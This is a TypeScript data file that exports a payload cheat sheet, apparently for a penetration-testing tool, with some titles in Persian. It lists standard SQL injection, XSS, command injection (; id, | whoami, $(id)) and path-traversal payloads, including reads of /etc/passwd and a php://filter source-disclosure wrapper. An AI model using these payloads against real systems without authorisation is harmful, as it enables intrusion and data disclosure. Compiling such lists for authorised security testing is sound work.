export type PayloadItem = {
  id: string;
  title: string;
  lang: string;
  code: string;
  note?: string;
};

export type PayloadGroup = {
  id: string;
  title: string;
  items: PayloadItem[];
};

export const PAYLOAD_GROUPS: PayloadGroup[] = [
  {
    id: "sqli",
    title: "SQL Injection",
    items: [
      {
        id: "sqli-auth",
        title: "Auth bypass",
        lang: "sql",
        code: `' OR '1'='1' --`,
      },
      {
        id: "sqli-union",
        title: "Union (۳ ستون)",
        lang: "sql",
        code: `' UNION SELECT NULL,NULL,NULL --`,
      },
      {
        id: "sqli-order",
        title: "تعداد ستون با ORDER BY",
        lang: "sql",
        code: `' ORDER BY 3 --`,
      },
      {
        id: "sqli-error-mysql",
        title: "Error-based MySQL",
        lang: "sql",
        code: `' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --`,
      },
      {
        id: "sqli-boolean",
        title: "Boolean",
        lang: "sql",
        code: `' AND 1=1 --\n' AND 1=2 --`,
      },
      {
        id: "sqli-time",
        title: "Time-based",
        lang: "sql",
        code: `' AND SLEEP(5) --`,
      },
      {
        id: "sqli-tables",
        title: "لیست جداول",
        lang: "sql",
        code: `' UNION SELECT NULL,table_name,NULL FROM information_schema.tables --`,
      },
    ],
  },
  {
    id: "xss",
    title: "XSS",
    items: [
      {
        id: "xss-script",
        title: "script ساده",
        lang: "html",
        code: `<script>alert(1)</script>`,
      },
      {
        id: "xss-img",
        title: "img onerror",
        lang: "html",
        code: `"><img src=x onerror=alert(1)>`,
      },
      {
        id: "xss-svg",
        title: "svg onload",
        lang: "html",
        code: `<svg onload=alert(1)>`,
      },
      {
        id: "xss-js",
        title: "javascript URL",
        lang: "html",
        code: `javascript:alert(1)`,
      },
      {
        id: "xss-attr",
        title: "شکستن attribute",
        lang: "html",
        code: `" autofocus onfocus=alert(1) x="`,
      },
    ],
  },
  {
    id: "cmdi",
    title: "Command Injection",
    items: [
      { id: "cmd-semi", title: "نقطه‌ویرگول", lang: "bash", code: `; id` },
      { id: "cmd-pipe", title: "پایپ", lang: "bash", code: `| whoami` },
      { id: "cmd-and", title: "AND", lang: "bash", code: `&& uname -a` },
      { id: "cmd-sub", title: "substitution", lang: "bash", code: `$(id)` },
      { id: "cmd-backtick", title: "backtick", lang: "bash", code: "`id`" },
    ],
  },
  {
    id: "lfi",
    title: "LFI / Path",
    items: [
      {
        id: "lfi-passwd",
        title: "passwd",
        lang: "text",
        code: `../../../../../../etc/passwd`,
      },
      {
        id: "lfi-wrap",
        title: "php wrapper",
        lang: "text",
        code: `php://filter/convert.base64-encode/resource=index.php`,
      },
      {
        id: "lfi-win",
        title: "Windows win.ini",
        lang: "text",
        code: `..\\..\\..\\windows\\win.ini`,
      },
    ],
  },
];
